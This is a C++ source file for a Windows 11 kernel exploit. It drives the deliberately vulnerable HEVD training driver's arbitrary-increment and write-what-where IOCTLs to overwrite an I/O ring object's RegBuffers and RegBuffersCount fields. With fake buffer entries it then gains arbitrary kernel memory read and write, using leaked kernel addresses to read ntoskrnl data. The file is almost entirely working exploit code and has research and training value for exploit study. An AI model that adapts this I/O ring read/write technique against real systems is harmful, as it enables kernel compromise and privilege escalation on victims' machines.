#include <ntstatus.h>
#define WIN32_NO_STATUS
#include <Windows.h>
#include <cstdio>
#include <ioringapi.h>
#include <winternl.h>
#include <intrin.h>
#include "Header.h"

HRESULT
GetNtosBase (
    _Out_ PVOID* Base,
    _Out_ PULONG Size
    )
{
    NTSTATUS status;
    PRTL_PROCESS_MODULES ModuleInfo;
    HRESULT result;

    ModuleInfo = nullptr;
    *Base = 0;
    *Size = 0;

    //
    // Allocate memory for the module list
    //
    ModuleInfo = (PRTL_PROCESS_MODULES)VirtualAlloc(NULL,
                                                    1024 * 1024,
                                                    MEM_COMMIT | MEM_RESERVE,
                                                    PAGE_READWRITE);

    if (!ModuleInfo)
    {
        result = GetLastError();
        printf("\nUnable to allocate memory for module list (%d)\n", result);
        goto Exit;
    }

    status = NtQuerySystemInformation(SystemModuleInformation,
                                      ModuleInfo,
                                      1024 * 1024,
                                      NULL);
    if (!NT_SUCCESS(status))
    {
        printf("\nError: Unable to query module list (%#x)\n", status);
        result = HRESULT_FROM_NT(status);
        goto Exit;
    }

    printf("*****************************************************\n");
    printf("Image base: %p\n", ModuleInfo->Modules[0].ImageBase);
    printf("Image name: %s\n", ModuleInfo->Modules[0].FullPathName + ModuleInfo->Modules[0].OffsetToFileName);
    printf("Image full path: %s\n", ModuleInfo->Modules[0].FullPathName);
    printf("Image size: 0x%x\n", ModuleInfo->Modules[0].ImageSize);
    printf("*****************************************************\n");

    //
    // First module is always ntos
    //
    *Base = ModuleInfo->Modules[0].ImageBase;
    *Size = ModuleInfo->Modules[0].ImageSize;
    result = S_OK;

Exit:
    if (ModuleInfo != nullptr)
    {
        VirtualFree(ModuleInfo, 0, MEM_RELEASE);
    }
    return result;
}

HRESULT
QueryIoringObject (
    _In_ HANDLE Handle,
    _Out_ PVOID* ObjectAddress
    )
{
    NTSTATUS status;
    HRESULT hResult;
    ULONG bytes;
    ULONG i;
    ULONG ioringTypeIndex;
    SYSTEM_HANDLE_INFORMATION localInfo;
    PSYSTEM_HANDLE_INFORMATION handleInfo = &localInfo;
    struct
    {
        OBJECT_TYPE_INFORMATION TypeInfo;
        WCHAR TypeNameBuffer[sizeof("IoRing")];
    } typeInfoWithName;

    hResult = S_OK;
    *ObjectAddress = 0;

    status = NtQueryObject(Handle,
                           ObjectTypeInformation,
                           &typeInfoWithName,
                           sizeof(typeInfoWithName),
                           NULL);
    if (!NT_SUCCESS(status))
    {
        printf("NtQueryObject failed: 0x%x\n", status);
        hResult = HRESULT_FROM_NT(status);
        goto Failure;
    }
    ioringTypeIndex = typeInfoWithName.TypeInfo.TypeIndex;

    status = NtQuerySystemInformation(SystemHandleInformation,
                                      handleInfo,
                                      sizeof(*handleInfo),
                                      &bytes);
    if (NT_SUCCESS(status))
    {
        printf("NtQuerySystemInformation failed: 0x%x\n", status);
        hResult = ERROR_UNIDENTIFIED_ERROR;
        goto Failure;
    }

    //
    // Add space for 100 more handles and try again
    //
    bytes += 100 * sizeof(*handleInfo);
    handleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(),
                                                       HEAP_ZERO_MEMORY,
                                                       bytes);
    status = NtQuerySystemInformation(SystemHandleInformation,
                                      handleInfo,
                                      bytes,
                                      &bytes);
    if (!NT_SUCCESS(status) || !handleInfo)
    {
        hResult = HRESULT_FROM_NT(status);
        printf("NtQuerySystemInformation #2 failed: 0x%x\n", status);
        goto Failure;
    }

    //
    // Enumerate each one
    //
    for (i = 0; i < handleInfo->NumberOfHandles; i++)
    {
        //
        // Check if this is the correct I/O ring handle
        //
        if ((handleInfo->Handles[i].ObjectTypeIndex == ioringTypeIndex) &&
            (handleInfo->Handles[i].UniqueProcessId == GetCurrentProcessId()) &&
            ((HANDLE)handleInfo->Handles[i].HandleValue == Handle))
        {
            printf("Found I/O ring address: 0x%p\n", handleInfo->Handles[i].Object);
            *ObjectAddress = handleInfo->Handles[i].Object;
            break;
        }
    }

Failure:
    //
    // Free the handle list if we had one
    //
    if (handleInfo != &localInfo)
    {
        HeapFree(GetProcessHeap(), 0, handleInfo);
    }
    return hResult;
}

/*
  Since this function is using arbitrary increment and not arbitrary write,
  both FakeBuffers and FakeBuffersCount have to be values we can reach through
  one arbitrary increment of any byte in those IoRing fields (1, 0x100, 0x10000...).
*/
HRESULT
HevdIncrementIoRingFields (
    _In_ PIORING_OBJECT IoRing,
    _In_ PVOID FakeBuffers,
    _In_ ULONG FakeBuffersCount
)
{
    ULONG byteOffsetFakeBuffers;
    ULONG byteOffsetCount;
    HRESULT result;
    HANDLE hFile;
    LPCSTR FileName = (LPCSTR)DEVICE_NAME;
    ULONG BytesReturned;
    ULONG64 incrementTarget;

    hFile = NULL;

    for (byteOffsetFakeBuffers = 0; byteOffsetFakeBuffers < 8; byteOffsetFakeBuffers++)
    {
        if (1 << ((ULONG64)byteOffsetFakeBuffers * 8) == (ULONG64)FakeBuffers)
        {
            break;
        }
    }
    for (byteOffsetCount = 0; byteOffsetCount < 8; byteOffsetCount++)
    {
        if (1 << ((ULONG64)byteOffsetCount * 8) == (ULONG64)FakeBuffersCount)
        {
            break;
        }
    }
    if ((byteOffsetFakeBuffers == 8) || (byteOffsetCount == 8))
    {
        printf("Invalid value of FakeBuffers or FakeBuffersCount: 0x%p, 0x%x",
               FakeBuffers,
               FakeBuffersCount);
    }

    //
    // Get the device handle
    //
    printf("\t[+] Getting Device Driver Handle\n");
    printf("\t\t[+] Device Name: %s\n", FileName);

    hFile = CreateFileA(FileName,
                        GENERIC_READ | GENERIC_WRITE,
                        FILE_SHARE_READ | FILE_SHARE_WRITE,
                        NULL,
                        OPEN_EXISTING,
                        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
                        NULL);

    if (hFile == INVALID_HANDLE_VALUE)
    {
        result = GetLastError();
        printf("\t\t[-] Failed Getting Device Handle: 0x%X\n", result);
        goto Exit;
    }
    else
    {
        printf("\t\t[+] Device Handle: 0x%X\n", hFile);
    }
    printf("\t[+] Setting Up Vulnerability Stage\n");

    printf("\t[+] Triggering Arbitrary Increment\n");

    printf("****************Kernel Mode****************\n");

    incrementTarget = ((ULONG64)&IoRing->RegBuffers) + byteOffsetFakeBuffers;
    if (!DeviceIoControl(hFile,
                         HACKSYS_EVD_IOCTL_ARBITRARY_INCREMENT,
                         &incrementTarget,
                         sizeof(PVOID),
                         NULL,
                         0,
                         &BytesReturned,
                         NULL))
    {
        result = GetLastError();
        printf("Failed incrementing RegBuffers: 0x%x\n", result);
        goto Exit;
    }

    incrementTarget = ((ULONG64)&IoRing->RegBuffersCount) + byteOffsetCount;
    if (!DeviceIoControl(hFile,
                         HACKSYS_EVD_IOCTL_ARBITRARY_INCREMENT,
                         &incrementTarget,
                         sizeof(PVOID),
                         NULL,
                         0,
                         &BytesReturned,
                         NULL))
    {
        result = GetLastError();
        printf("Failed incrementing RegBuffersCount: 0x%x\n", result);
        goto Exit;
    }

    result = S_OK;

Exit:
    if (hFile != INVALID_HANDLE_VALUE)
    {
        CloseHandle(hFile);
    }
    return result;
}

HRESULT
HevdOverwriteIoRingFields (
    _In_ PIORING_OBJECT IoRing,
    _In_ PVOID FakeBuffers,
    _In_ ULONG FakeBuffersCount
    )
{
    HRESULT result;
    ULONG BytesReturned;
    HANDLE hFile = NULL;
    LPCSTR FileName = (LPCSTR)DEVICE_NAME;
    PWRITE_WHAT_WHERE WriteWhatWhere = NULL;

    //
    // Get the device handle
    //
    printf("\t[+] Getting Device Driver Handle\n");
    printf("\t\t[+] Device Name: %s\n", FileName);

    hFile = CreateFileA(FileName,
                        GENERIC_READ | GENERIC_WRITE,
                        FILE_SHARE_READ | FILE_SHARE_WRITE,
                        NULL,
                        OPEN_EXISTING,
                        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
                        NULL);

    if (hFile == INVALID_HANDLE_VALUE)
    {
        result = GetLastError();
        printf("\t\t[-] Failed Getting Device Handle: 0x%X\n", result);
        goto Exit;
    }
    else
    {
        printf("\t\t[+] Device Handle: 0x%X\n", hFile);
    }

    printf("\t[+] Setting Up Vulnerability Stage\n");

    printf("\t\t[+] Allocating Memory For WRITE_WHAT_WHERE Structure\n");

    // Allocate the Heap chunk
    WriteWhatWhere = (PWRITE_WHAT_WHERE)HeapAlloc(GetProcessHeap(),
                                                  HEAP_ZERO_MEMORY,
                                                  sizeof(WRITE_WHAT_WHERE));
    if (!WriteWhatWhere)
    {
        result = GetLastError();
        printf("\t\t[-] Failed To Allocate Memory: 0x%X\n", result);
        goto Exit;
    }
    else
    {
        printf("\t\t\t[+] Memory Allocated: 0x%p\n", WriteWhatWhere);
        printf("\t\t\t[+] Allocation Size: 0x%X\n", sizeof(WRITE_WHAT_WHERE));
    }

    //
    // Set up and trigger arbitrary write to overwrite the ioring regbuffers
    //
    printf("\t\t[+] Preparing WRITE_WHAT_WHERE structure\n");

    WriteWhatWhere->What = (PULONG_PTR)&FakeBuffers;
    WriteWhatWhere->Where = (PULONG_PTR)&IoRing->RegBuffers;

    printf("\t\t\t[+] WriteWhatWhere: 0x%p\n", WriteWhatWhere);
    printf("\t\t\t[+] WriteWhatWhere->What: 0x%p\n", WriteWhatWhere->What);
    printf("\t\t\t[+] WriteWhatWhere->Where: 0x%p\n", WriteWhatWhere->Where);

    printf("\t[+] Triggering Arbitrary Memory Overwrite\n");

    printf("****************Kernel Mode****************\n");

    DeviceIoControl(hFile,
                    HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE,
                    (LPVOID)WriteWhatWhere,
                    sizeof(WRITE_WHAT_WHERE),
                    NULL,
                    0,
                    &BytesReturned,
                    NULL);

    //
    // Trigger arbitrary write again, this time to overwrite the number of registered buffers
    //
    WriteWhatWhere->What = (PULONG_PTR)&FakeBuffersCount;
    WriteWhatWhere->Where = (PULONG_PTR)&IoRing->RegBuffersCount;

    DeviceIoControl(hFile,
                    HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE,
                    (LPVOID)WriteWhatWhere,
                    sizeof(WRITE_WHAT_WHERE),
                    NULL,
                    0,
                    &BytesReturned,
                    NULL);

    result = S_OK;

Exit:
    if (WriteWhatWhere != nullptr)
    {
        HeapFree(GetProcessHeap(), 0, (LPVOID)WriteWhatWhere);
    }
    if (hFile != INVALID_HANDLE_VALUE)
    {
        CloseHandle(hFile);
    }
    return result;
}

HRESULT
SetupBufferEntry (
    _In_ BOOLEAN McBufferEntrySupported,
    _In_ PVOID FakeBuffersArray,
    _In_ ULONG NumberOfFakeBuffers,
    _In_ PVOID TargetAddress,
    _In_ ULONG Length,
    _Out_ PULONG NewBufferIndex
    )
{
    PIOP_MC_BUFFER_ENTRY mcBufferEntry;
    IORING_BUFFER_INFO* bufferEntry;
    HRESULT result;

    result = S_OK;
    *NewBufferIndex = -1;

    if (McBufferEntrySupported)
    {
        mcBufferEntry = (PIOP_MC_BUFFER_ENTRY)VirtualAlloc(NULL,
                                                           sizeof(IOP_MC_BUFFER_ENTRY),
                                                           MEM_COMMIT,
                                                           PAGE_READWRITE);
        if (mcBufferEntry == nullptr)
        {
            result = GetLastError();
            printf("Failed to allocate memory: 0x%x\n", result);
            return result;
        }
        mcBufferEntry->Address = TargetAddress;
        mcBufferEntry->Length = Length;
        mcBufferEntry->Type = 0xc02;
        mcBufferEntry->Size = 0x80; // 0x20 * (numberOfPagesInBuffer + 3)
        mcBufferEntry->AccessMode = 1;
        mcBufferEntry->ReferenceCount = 1;

        //
        // Find first unused entry and have it point to the new buffer entry
        //
        for (int i = 0; i < NumberOfFakeBuffers; i++)
        {
            if (((PULONG64)FakeBuffersArray)[i] == 0)
            {
                ((PULONG64)FakeBuffersArray)[i] = (ULONG64)mcBufferEntry;
                *NewBufferIndex = i;
                break;
            }
        }
    }
    else
    {
        for (int i = 0; i < NumberOfFakeBuffers; i++)
        {
            bufferEntry = &((IORING_BUFFER_INFO*)FakeBuffersArray)[i];
            if (bufferEntry->Address == 0)
            {
                bufferEntry->Address = TargetAddress;
                bufferEntry->Length = Length;
                *NewBufferIndex = i;
                break;
            }
        }
    }
    if (*NewBufferIndex == -1)
    {
        printf("Buffer array is full, no more room for new entries\n");
        result = S_FALSE;
    }

    return result;
}

HRESULT
IsMcBufferEntrySupported (
    _Out_ PBOOLEAN McBufferEntrySupported
    )
{
    RTL_OSVERSIONINFOW versionInfo;
    NTSTATUS status;

    *McBufferEntrySupported = FALSE;

    status = RtlGetVersion(&versionInfo);

    if (status != STATUS_SUCCESS)
    {
        printf("Failed to call RtlGetVersion! Error 0x%x\n", status);
        return HRESULT_FROM_NT(status);
    }
    if ((versionInfo.dwMajorVersion < 10) ||
        (versionInfo.dwBuildNumber < 22557))
    {
        printf("Exploit only availbale starting Windows 11 build 22557\n");
        return S_FALSE;
    }
    if (versionInfo.dwBuildNumber >= 22610)
    {
        *McBufferEntrySupported = TRUE;
    }
    return S_OK;
}

PVOID
AllocateFakeBuffersArray (
    _In_ BOOLEAN McBufferArraySupported,
    _In_ ULONG NumberOfFakeBuffers,
    _In_opt_ PVOID AddressForArray
    )
{
    ULONG size;
    PVOID fakeBuffers;

    if (McBufferArraySupported)
    {
        //
        // This will be an array of pointers
        //
        size = sizeof(ULONG64) * NumberOfFakeBuffers;
    }
    else
    {
        //
        // This will be an array of IORING_BUFFER_INFOs
        //
        size = sizeof(IORING_BUFFER_INFO) * NumberOfFakeBuffers;
    }
    fakeBuffers = (PULONG64)VirtualAlloc(AddressForArray,
                                         size,
                                         MEM_RESERVE | MEM_COMMIT,
                                         PAGE_READWRITE);
    if (fakeBuffers != nullptr)
    {
        memset(fakeBuffers, 0, size);
    }
    return fakeBuffers;
}

void
FreeFakeBuffers (
    _In_ BOOLEAN McBufferEntrySupported,
    _In_ PVOID FakeBuffers,
    _In_ ULONG NumberOfFakeBuffers
    )
{
    if (McBufferEntrySupported)
    {
        //
        // Free every allocated IOP_MC_BUFFER_ENTRY
        //
        for (int i = 0; i < NumberOfFakeBuffers; i++)
        {
            if (((PULONG64)FakeBuffers)[i] == 0)
            {
                break;
            }
            VirtualFree((PVOID)(((PULONG64)FakeBuffers)[i]), NULL, MEM_RELEASE);
        }
    }
    VirtualFree(FakeBuffers, NULL, MEM_RELEASE);
}

void
ReadExploitFile (
    _In_ HANDLE OutputFileHandle
    )
{
    PVOID buf;
    DWORD bytesRead;
    BOOL res;

    buf = VirtualAlloc(NULL,
                       KERNEL_READ_SIZE,
                       MEM_COMMIT,
                       PAGE_READWRITE);
    if (buf == nullptr)
    {
        goto Exit;
    }

    res = ReadFile(OutputFileHandle,
                   buf,
                   0x1000,
                   &bytesRead,
                   NULL);
    if (res == FALSE)
    {
        printf("Failed reading file %d\n", GetLastError());
        goto Exit;
    }
    for (int i = 0; i < bytesRead / 8; i++)
    {
        printf("%llx ", *((PULONG64)buf + i));
    }
Exit:
    if (buf != nullptr)
    {
        VirtualFree(buf, NULL, MEM_RELEASE);
    }
}

HRESULT
ArbitraryReadWrite (
    _In_ BOOLEAN Increment
    )
{
    HRESULT result;
    HIORING handle = NULL;
    _HIORING* pHandle = NULL;
    IORING_CREATE_FLAGS flags;
    IORING_HANDLE_REF requestDataFile = IoRingHandleRefFromHandle(0);
    IORING_BUFFER_REF requestDataBuffer = IoRingBufferRefFromPointer(0);
    UINT32 submittedEntries;
    PVOID zeroBuf;
    ULONG bytesWritten;
    IORING_CQE cqe;

    HANDLE outputClientPipe;
    HANDLE inputClientPipe;
    HANDLE inputPipe;
    HANDLE outputPipe;

    PVOID addressForFakeBuffers;
    PULONG64 fake_buffers;
    PIORING_OBJECT ioringAddress;
    ULONG numberOfFakeBuffers;
    ULONG64 zeroAddress;
    BOOLEAN mcBufferArraySupported;
    ULONG newBufferIndex;

    PVOID ntosBase;
    ULONG ntosSize;

    fake_buffers = nullptr;
    numberOfFakeBuffers = 0x100;
    addressForFakeBuffers = NULL;
    inputPipe = INVALID_HANDLE_VALUE;
    outputPipe = INVALID_HANDLE_VALUE;
    inputClientPipe = INVALID_HANDLE_VALUE;
    outputClientPipe = INVALID_HANDLE_VALUE;

    result = IsMcBufferEntrySupported(&mcBufferArraySupported);
    if (!SUCCEEDED(result))
    {
        goto Exit;
    }

    //
    // Create an I/O ring and get the object address
    //
    flags.Required = IORING_CREATE_REQUIRED_FLAGS_NONE;
    flags.Advisory = IORING_CREATE_ADVISORY_FLAGS_NONE;
    result = CreateIoRing(IORING_VERSION_3, flags, 0x10000, 0x20000, &handle);
    if (!SUCCEEDED(result))
    {
        printf("Failed creating IO ring handle: 0x%x\n", result);
        goto Exit;
    }

    result = QueryIoringObject(*(PHANDLE)handle, (PVOID*)&ioringAddress);
    if (!SUCCEEDED(result))
    {
        printf("Failed finding I/O ring object address: 0x%x\n", result);
        goto Exit;
    }

    //
    // Allocate and set up a fake buffers array.
    // If we're using arbitrary increment, allocate at a fixed address that
    // we can get through one increment.
    //
    if (Increment != FALSE)
    {
        addressForFakeBuffers = (PVOID)0x1000000;
    }

    fake_buffers = (PULONG64)AllocateFakeBuffersArray(mcBufferArraySupported,
                                                      numberOfFakeBuffers,
                                                      addressForFakeBuffers);
    if (fake_buffers == nullptr)
    {
        result = GetLastError();
        printf("Failed to allocate memory: 0x%x\n", result);
        goto Exit;
    }

    //
    // Use HEVD to overwrite IoRing->RegBuffers with fake_buffers
    // and RegBuffersCount with numberOfFakeBuffers.
    //
    if (Increment != FALSE)
    {
        result = HevdIncrementIoRingFields(ioringAddress,
                                           fake_buffers,
                                           numberOfFakeBuffers);
    }
    else
    {
        result = HevdOverwriteIoRingFields(ioringAddress,
                                           fake_buffers,
                                           numberOfFakeBuffers);
    }
    if (result != S_OK)
    {
        printf("Failed overwriting I/O ring fields: 0x%x\n", result);
        goto Exit;
    }

    //
    // Create named pipes for the input/output of the I/O operations
    // and open client handles for them
    //
    inputPipe = CreateNamedPipe(INPUT_PIPE_NAME, PIPE_ACCESS_DUPLEX, PIPE_WAIT, 255, 0x1000, 0x1000, 0, NULL);
    if (inputPipe == INVALID_HANDLE_VALUE)
    {
        printf("Failed to create input pipe: 0x%x\n", GetLastError());
        goto Exit;
    }
    outputPipe = CreateNamedPipe(OUTPUT_PIPE_NAME, PIPE_ACCESS_DUPLEX, PIPE_WAIT, 255, 0x1000, 0x1000, 0, NULL);
    if (outputPipe == INVALID_HANDLE_VALUE)
    {
        printf("Failed to create output pipe: 0x%x\n", GetLastError());
        goto Exit;
    }

    outputClientPipe = CreateFile(OUTPUT_PIPE_NAME,
                                  GENERIC_READ | GENERIC_WRITE,
                                  FILE_SHARE_READ | FILE_SHARE_WRITE,
                                  NULL,
                                  OPEN_ALWAYS,
                                  FILE_ATTRIBUTE_NORMAL,
                                  NULL);

    if (outputClientPipe == INVALID_HANDLE_VALUE)
    {
        printf("Failed to open handle to output file: 0x%x\n", GetLastError());
        goto Exit;
    }

    inputClientPipe = CreateFile(INPUT_PIPE_NAME,
                                 GENERIC_READ | GENERIC_WRITE,
                                 FILE_SHARE_READ | FILE_SHARE_WRITE,
                                 NULL,
                                 OPEN_ALWAYS,
                                 FILE_ATTRIBUTE_NORMAL,
                                 NULL);

    if (inputClientPipe == INVALID_HANDLE_VALUE)
    {
        printf("Failed to open handle to input pipe: 0x%x\n", GetLastError());
        goto Exit;
    }

    //
    // Write the new buffer to the kernelBase structure so we can use the
    // fake buffers with the Win32 ioring functions
    //
    pHandle = *(_HIORING**)&handle;
    pHandle->BufferArraySize = numberOfFakeBuffers;
    pHandle->RegBufferArray = fake_buffers;

    //
    // Get base address and size of NTOS
    //
    result = GetNtosBase(&ntosBase, &ntosSize);
    if (!SUCCEEDED(result))
    {
        printf("Failed finding NTOS base address: 0x%x\n", result);
        goto Exit;
    }

    //
    // Setup the buffer entry for our arbitrary kernel read
    // 0xC00000 is the offset of the data section in NTOS, hardcoded due to laziness
    // Use "write" operation to write data into the client handle of the pipe, that we'll
    // later read from using the server's handle. 
    //
    result = SetupBufferEntry(mcBufferArraySupported,
                              fake_buffers,
                              numberOfFakeBuffers,
                              (PVOID)((ULONG64)ntosBase + 0xC00000),
                              KERNEL_READ_SIZE,
                              &newBufferIndex);
    requestDataBuffer = IoRingBufferRefFromIndexAndOffset(newBufferIndex, 0);
    requestDataFile = IoRingHandleRefFromHandle(outputClientPipe);
    //
    // Queue arbitrary read
    //
    printf("Reading kernel data...\n");
    result = BuildIoRingWriteFile(handle,
                                  requestDataFile,
                                  requestDataBuffer,
                                  KERNEL_READ_SIZE,
                                  0,
                                  FILE_WRITE_FLAGS_NONE,
                                  NULL,
                                  IOSQE_FLAGS_NONE);
    if (!SUCCEEDED(result))
    {
        printf("Failed building IO ring read file structure: 0x%x\n", result);
        goto Exit;
    }

    result = SubmitIoRing(handle, 0, 0, &submittedEntries);
    if (!SUCCEEDED(result))
    {
        printf("Failed submitting IO ring: 0x%x\n", result);
        goto Exit;
    }
    //
    // Check the completion queue for the actual status code for the operation
    //
    result = PopIoRingCompletion(handle, &cqe);
    if ((!SUCCEEDED(result)) || (!NT_SUCCESS(cqe.ResultCode)))
    {
        printf("Failed reading kernel memory 0x%x\n", cqe.ResultCode);
        goto Cleanup;
    }
    printf("Successfully read kernel data\n");

    ReadExploitFile(outputPipe);

Cleanup:
    //
    // Queue a final I/O operation to zero out IoRing->RegBuffers.
    // First, write 0 into the input pipe, so we can use it for our arbitrary write.
    //
    zeroBuf = 0;
    if (WriteFile(inputPipe, &zeroBuf, sizeof(PVOID), &bytesWritten, NULL) == FALSE)
    {
        result = GetLastError();
        printf("Failed to write into the input pipe: 0x%x\n", result);
        goto Exit;
    }

    //
    // Setup another buffer entry, with the address of ioring->RegBuffers as the target
    // Use the client's handle of the input pipe for the read operation
    //
    result = SetupBufferEntry(mcBufferArraySupported,
                              fake_buffers,
                              numberOfFakeBuffers,
                              &ioringAddress->RegBuffers,
                              sizeof(PVOID),
                              &newBufferIndex);
    requestDataBuffer = IoRingBufferRefFromIndexAndOffset(1, 0);
    requestDataFile = IoRingHandleRefFromHandle(inputClientPipe);

    result = BuildIoRingReadFile(handle,
                                 requestDataFile,
                                 requestDataBuffer,
                                 sizeof(PVOID),
                                 0,
                                 NULL,
                                 IOSQE_FLAGS_NONE);
    if (!SUCCEEDED(result))
    {
        printf("Failed building IO ring read file structure: 0x%x\n", result);
        goto Exit;
    }

    result = SubmitIoRing(handle, 0, 0, &submittedEntries);
    if (!SUCCEEDED(result))
    {
        printf("Failed submitting IO ring: 0x%x\n", result);
        goto Exit;
    }

    result = S_OK;

Exit:
    if (outputPipe != INVALID_HANDLE_VALUE)
    {
        CloseHandle(outputPipe);
    }
    if (inputPipe != INVALID_HANDLE_VALUE)
    {
        CloseHandle(inputPipe);
    }
    if (outputClientPipe != INVALID_HANDLE_VALUE)
    {
        CloseHandle(outputClientPipe);
    }
    if (inputClientPipe != INVALID_HANDLE_VALUE)
    {
        CloseHandle(inputClientPipe);
    }
    if (fake_buffers != nullptr)
    {
        FreeFakeBuffers(mcBufferArraySupported, fake_buffers, numberOfFakeBuffers);
    }
    if (pHandle != NULL)
    {
        pHandle->BufferArraySize = 0;
        pHandle->RegBufferArray = 0;
    }
    if (handle != NULL)
    {
        CloseIoRing(handle);
    }
    return result;
}

int main()
{
    ArbitraryReadWrite(TRUE);
    ExitProcess(0);
}